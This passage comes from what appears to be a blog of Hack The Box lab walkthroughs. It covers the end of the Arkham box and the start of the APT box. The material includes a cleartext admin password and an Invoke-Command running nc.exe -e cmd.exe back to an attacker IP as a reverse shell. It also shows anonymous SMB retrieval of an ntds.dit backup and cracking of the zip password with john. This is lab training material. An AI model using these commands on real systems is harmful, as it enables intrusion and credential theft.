class="hljs-keyword">done</span>, 0 items skipped.<br></code></pre></td></tr></table></figure><p>当前目录便会生成一个新文档：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># ls</span><br>alfred@arkham.local.ost  Drafts.mbox<br></code></pre></td></tr></table></figure><p>可以用Word打开：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411170940252.png" alt="image-20220411170940252" /><p>这样我就获取到了batman用户的密码，我可以看一眼batman用户的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\Alfred\Downloads\backups&gt;net user batman<br>net user batman<br>User name                    Batman<br>Full Name                    <br>Comment                      <br>User<span class="hljs-string">&#x27;s comment               </span><br><span class="hljs-string">Country/region code          001 (United States)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            2/3/2019 9:25:50 AM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          2/3/2019 9:25:50 AM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script                 </span><br><span class="hljs-string">User profile                 </span><br><span class="hljs-string">Home directory               </span><br><span class="hljs-string">Last logon                   4/11/2022 11:24:12 AM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Administrators       *Remote Management Use</span><br><span class="hljs-string">                             *Users                </span><br><span class="hljs-string">Global Group memberships     *None                 </span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">C:\Users\Alfred\Downloads\backups&gt;</span><br></code></pre></td></tr></table></figure><p>好吧，人家Batman是管理组，那我可以想方法以Batman身份向我自己的机器建立一个反向shell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\Alfred\Downloads\backups&gt;powershell<br>powershell<br>Windows PowerShell <br>Copyright (C) Microsoft Corporation. All rights reserved.<br><br><span class="hljs-built_in">PS</span> C:\Users\Alfred\Downloads\backups&gt; <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;batman&#x27;</span><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;batman&#x27;</span><br><span class="hljs-built_in">PS</span> C:\Users\Alfred\Downloads\backups&gt; <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;Zx^#QZX+T!123&#x27;</span><br><span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;Zx^#QZX+T!123&#x27;</span><br><span class="hljs-built_in">PS</span> C:\Users\Alfred\Downloads\backups&gt; <br><br><span class="hljs-built_in">PS</span> C:\Users\Alfred\Downloads\backups&gt; <span class="hljs-variable">$securePassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$securePassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">PS</span> C:\Users\Alfred\Downloads\backups&gt; <span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span><br><span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span><br><span class="hljs-built_in">PS</span> C:\Users\Alfred\Downloads\backups&gt; <span class="hljs-built_in">Invoke-command</span> <span class="hljs-literal">-computername</span> ARKHAM <span class="hljs-literal">-credential</span> <span class="hljs-variable">$credential</span> <span class="hljs-literal">-scriptblock</span> &#123; cmd.exe /c <span class="hljs-string">&quot;C:\windows\system32\spool\drivers\color\nc.exe&quot;</span> <span class="hljs-literal">-e</span> cmd.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">16.5</span> <span class="hljs-number">1339</span> &#125;<br><span class="hljs-built_in">Invoke-command</span> <span class="hljs-literal">-computername</span> ARKHAM <span class="hljs-literal">-credential</span> <span class="hljs-variable">$credential</span> <span class="hljs-literal">-scriptblock</span> &#123; cmd.exe /c <span class="hljs-string">&quot;C:\windows\system32\spool\drivers\color\nc.exe&quot;</span> <span class="hljs-literal">-e</span> cmd.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">16.5</span> <span class="hljs-number">1339</span> &#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># nc -lvnp 1339           </span><br>listening on [any] 1339 ...<br>connect to [10.10.16.5] from (UNKNOWN) [10.10.10.130] 49695<br>Microsoft Windows [Version 10.0.17763.107]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Users\Batman\Documents&gt;<span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>arkham\batman<br><br>C:\Users\Batman\Documents&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - APT</title>
    <link href="/post/HackTheBox-APT.html"/>
    <url>/post/HackTheBox-APT.html</url>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -sC -sV -Pn -p- -oA APT.nmap.txt 10.10.10.213<br>[sudo] mosaic 的密码：<br>Starting Nmap 7.92SVN ( https://google.com ) at 2022-05-26 17:55 CST<br>Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 9.35% <span class="hljs-keyword">done</span>; ETC: 18:08 (0:11:18 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.213<br>Host is up (0.19s latency).<br>Not shown: 65533 filtered tcp ports (no-response)<br>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: Gigantic Hosting | Home<br>135/tcp open  msrpc   Microsoft Windows RPC<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 311.80 seconds<br></code></pre></td></tr></table></figure><p>Inexplicably, I rescanned it a few times, but the results were the same, a bit unusual for an active directory host with only two ports.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb http://10.10.10.213<br>http://10.10.10.213 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@gigantichosting.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.213], JQuery, Microsoft-IIS[10.0], Script[application/x-javascript,text/javascript], Title[Gigantic Hosting | Home]<br></code></pre></td></tr></table></figure><p>The information on port 80 is pretty arbitrary, they seem like the authors are abusing the CV in their construction, and maybe it doesn’t matter. All I found was this looks like a user name.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">W3layouts<br></code></pre></td></tr></table></figure><p>The table of contents doesn’t have any information, right.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirsearch -u http://10.10.10.213     <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/mosaic/.dirsearch/reports/10.10.10.213/_22-05-26_18-12-23.txt<br><br>Error Log: /home/mosaic/.dirsearch/logs/errors-22-05-26_18-12-23.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.213/<br><br>[18:12:24] Starting: <br>[18:12:28] 403 -  312B  - /%2e%2e//google.com<br>[18:12:28] 301 -  146B  - /js  -&gt;  http://10.10.10.213/js/<br>[18:12:44] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[18:12:45] 200 -    9KB - /about.html<br>[18:13:09] 301 -  147B  - /css  -&gt;  http://10.10.10.213/css/<br>[18:13:15] 301 -  149B  - /fonts  -&gt;  http://10.10.10.213/fonts/<br>[18:13:18] 301 -  150B  - /images  -&gt;  http://10.10.10.213/images/<br>[18:13:18] 403 -    1KB - /images/<br>[18:13:18] 200 -   15KB - /index.html<br>[18:13:20] 403 -    1KB - /js/<br>[18:13:29] 200 -    5KB - /news.html<br>[18:13:45] 200 -    6KB - /support.html<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wget -m 10.10.10.213<br></code></pre></td></tr></table></figure><p>什么都没获取到，元属性也不包含任何信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool services.html <br>ExifTool Version Number         : 12.41<br>File Name                       : services.html<br>Directory                       : .<br>File Size                       : 10 KiB<br>File Modification Date/Time     : 2019:12:23 19:30:22+08:00<br>File Access Date/Time           : 2022:05:26 18:19:08+08:00<br>File Inode Change Date/Time     : 2022:05:26 18:19:08+08:00<br>File Permissions                : -rw-r--r--<br>File Type                       : TXT<br>File Type Extension             : txt<br>MIME Type                       : text/plain<br>MIME Encoding                   : us-ascii<br>Newlines                        : Unix LF<br>Line Count                      : 243<br>Word Count                      : 870<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rpcmap.py <span class="hljs-string">&#x27;ncacn_ip_tcp:10.10.10.213&#x27;</span><br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 00000136-0000-0000-C000-000000000046 v0.0<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 000001A0-0000-0000-C000-000000000046 v0.0<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: 64FE0B7F-9EF5-4553-A7DB-9A1975777554 v1.0<br><br>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0<br><br>Protocol: [MS-RPCE]: Remote Management Interface<br>Provider: rpcrt4.dll<br>UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote<br>Provider: rpcss.dll<br>UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0<br>Opnum 0: rpc_x_bad_stub_data<br>Opnum 1: rpc_x_bad_stub_data<br>Opnum 2: rpc_x_bad_stub_data<br>Opnum 3: success<br>Opnum 4: rpc_x_bad_stub_data<br>Opnum 5: success<br><br>Protocol: [MS-RPCE]: Remote Management Interface<br>Provider: rpcrt4.dll<br>UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0<br>Opnum 0: success<br>Opnum 1: rpc_x_bad_stub_data<br>Opnum 2: success<br>Opnum 3: success<br>Opnum 4: rpc_x_bad_stub_data<br>Opnum 5: nca_s_op_rng_error (opnum not found)<br><br>Procotol: N/A<br>Provider: rpcss.dll<br>UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0<br>Opnum 0: rpc_fault_cant_perform<br>Opnum 1: rpc_fault_cant_perform<br>Opnum 2: rpc_x_bad_stub_data<br>Opnum 3: rpc_x_bad_stub_data<br>Opnum 4: rpc_x_bad_stub_data<br>Opnum 5: rpc_fault_cant_perform<br></code></pre></td></tr></table></figure><p>All the others are access failures, but these three are special. There is a POC on github that enumerates network interfaces based on RPC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/mubix/IOXIDResolver.git<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ IOXIDResolver.py -h<br>IOXIDResolver.py -t &lt;target&gt;<br>$ IOXIDResolver.py -t 10.10.10.213<br>[*] Retrieving network interface of 10.10.10.213<br>Address: apt<br>Address: 10.10.10.213<br>Address: dead:beef::b885:d62a:d679:573f<br>Address: dead:beef::8c6b:eefa:c3ea:9d75<br>Address: dead:beef::236<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ping dead:beef::8c6b:eefa:c3ea:9d75<br>PING dead:beef::8c6b:eefa:c3ea:9d75(dead:beef::8c6b:eefa:c3ea:9d75) 56 data bytes<br>64 bytes from dead:beef::8c6b:eefa:c3ea:9d75: icmp_seq=1 ttl=63 time=244 ms<br>64 bytes from dead:beef::8c6b:eefa:c3ea:9d75: icmp_seq=2 ttl=63 time=203 ms<br>64 bytes from dead:beef::8c6b:eefa:c3ea:9d75: icmp_seq=3 ttl=63 time=289 ms<br>64 bytes from dead:beef::8c6b:eefa:c3ea:9d75: icmp_seq=4 ttl=63 time=725 ms<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Thu May 26 20:32:49 2022 as: nmap -6 -sC -sV -Pn -p- -oA APT.nmap.txt dead:beef::b885:d62a:d679:573f</span><br>Nmap scan report <span class="hljs-keyword">for</span> dead:beef::b885:d62a:d679:573f<br>Host is up (0.42s latency).<br>Not shown: 65512 filtered tcp ports (no-response)<br>PORT      STATE SERVICE      VERSION<br>53/tcp    open  domain       Simple DNS Plus<br>80/tcp    open  http         Microsoft IIS httpd 10.0<br>|_http-title: Bad Request<br>| http-server-header: <br>|   Microsoft-HTTPAPI/2.0<br>|_  Microsoft-IIS/10.0<br>88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-05-26 12:56:12Z)<br>135/tcp   open  msrpc        Microsoft Windows RPC<br>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-26T12:57:45+00:00; -1s from scanner time.<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-26T12:57:44+00:00; 0s from scanner time.<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-26T12:57:45+00:00; -1s from scanner time.<br>3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=apt.htb.local<br>| Subject Alternative Name: DNS:apt.htb.local<br>| Not valid before: 2020-09-24T07:07:18<br>|_Not valid after:  2050-09-24T07:17:18<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-26T12:57:44+00:00; -1s from scanner time.<br>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Bad Request<br>9389/tcp  open  mc-nmf       .NET Message Framing<br>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Bad Request<br>49664/tcp open  msrpc        Microsoft Windows RPC<br>49665/tcp open  msrpc        Microsoft Windows RPC<br>49666/tcp open  msrpc        Microsoft Windows RPC<br>49667/tcp open  msrpc        Microsoft Windows RPC<br>49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>49670/tcp open  msrpc        Microsoft Windows RPC<br>49675/tcp open  msrpc        Microsoft Windows RPC<br>49695/tcp open  msrpc        Microsoft Windows RPC<br>59465/tcp open  msrpc        Microsoft Windows RPC<br>Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-security-mode: <br>|   account_used: &lt;blank&gt;<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: required<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-05-26T12:57:20<br>|_  start_date: 2022-05-26T03:24:56<br>|_clock-skew: mean: -8m35s, deviation: 22m39s, median: -1s<br>| smb-os-discovery: <br>|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br>|   Computer name: apt<br>|   NetBIOS computer name: APT\x00<br>|   Domain name: htb.local<br>|   Forest name: htb.local<br>|   FQDN: apt.htb.local<br>|_  System time: 2022-05-26T13:57:16+01:00<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/<br><span class="hljs-comment"># Nmap done at Thu May 26 20:57:53 2022 -- 1 IP address (1 host up) scanned in 1504.15 seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb dead:beef::b885:d62a:d679:573f --shares -u <span class="hljs-string">&quot;&quot;</span> -p <span class="hljs-string">&quot;&quot;</span><br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\: STATUS_ACCESS_DENIED <br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] Enumerated shares<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ            <br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC<br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share <br>SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share <br></code></pre></td></tr></table></figure><p>SMB allows anonymous access to:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient.py -target-ip apt backup<br><span class="hljs-comment"># shares</span><br>backup<br>IPC$<br>NETLOGON<br>SYSVOL<br><span class="hljs-comment"># use backup</span><br><span class="hljs-comment"># ls</span><br>drw-rw-rw-          0  Thu Sep 24 15:31:03 2020 .<br>drw-rw-rw-          0  Thu Sep 24 15:31:03 2020 ..<br>-rw-rw-rw-   10650961  Thu Sep 24 15:31:03 2020 backup.zip<br><span class="hljs-comment"># get backup.zip</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ unzip backup.zip <br>Archive:  backup.zip<br>   creating: Active Directory/<br>[backup.zip] Active Directory/ntds.dit password: <br>   skipping: Active Directory/ntds.dit  incorrect password<br>   skipping: Active Directory/ntds.jfm  incorrect password<br>   creating: registry/<br>   skipping: registry/SECURITY       incorrect password<br>   skipping: registry/SYSTEM         incorrect password<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ unzip -l backup.zip <br>Archive:  backup.zip<br>  Length      Date    Time    Name<br>---------  ---------- -----   ----<br>        0  2020-09-23 19:40   Active Directory/<br> 50331648  2020-09-23 19:38   Active Directory/ntds.dit<br>    16384  2020-09-23 19:38   Active Directory/ntds.jfm<br>        0  2020-09-23 19:40   registry/<br>   262144  2020-09-23 19:22   registry/SECURITY<br> 12582912  2020-09-23 19:22   registry/SYSTEM<br>---------                     -------<br> 63193088                     6 files<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ zip2john backup.zip&gt;backup.zip.hash<br>$ john -w=/usr/share/wordlists/rockyou.txt backup.zip.hash <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>iloveyousomuch   (backup.zip)     <br>1g 0:00:00:00 DONE (2022-05-27 02:23) 100.0g/s 1638Kp/s 1638Kc/s 